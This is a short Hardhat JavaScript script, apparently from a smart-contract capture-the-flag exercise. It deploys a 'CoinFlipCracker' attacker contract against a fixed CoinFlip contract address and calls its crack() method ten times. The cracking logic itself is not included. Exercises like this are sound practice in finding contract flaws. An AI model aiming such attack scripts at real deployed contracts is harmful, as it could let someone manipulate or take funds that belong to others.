const { ethers } = require("hardhat")

const CONTRACT_NAME = "CoinFlip"
const ATTACKER_CONTRACT = "CoinFlipCracker"
const CONTRACT_ADDRESS = "0xF27a48Ebe039E1bE2EC304B9E781EC479c6E2de8"

async function main() {
    ;[_owner, attacker] = await ethers.getSigners()

    //get factory for attacker contract
    const attackerFactory = await ethers.getContractFactory(ATTACKER_CONTRACT)
    //trigger deploy of attacker  contract
    let attackerContract = await attackerFactory.deploy(CONTRACT_ADDRESS)
    //await attacker deployment
    await attackerContract.deployed()

    //call .crack() method 10 times
    for (let i = 1; i <= 10; i++) {
        console.log(`Performing attack #${i}...`)
        tx = await attackerContract.crack()
        await tx.wait(1)
    }
}

main().catch((error) => {
    console.error(error)
    process.exit(1)
})
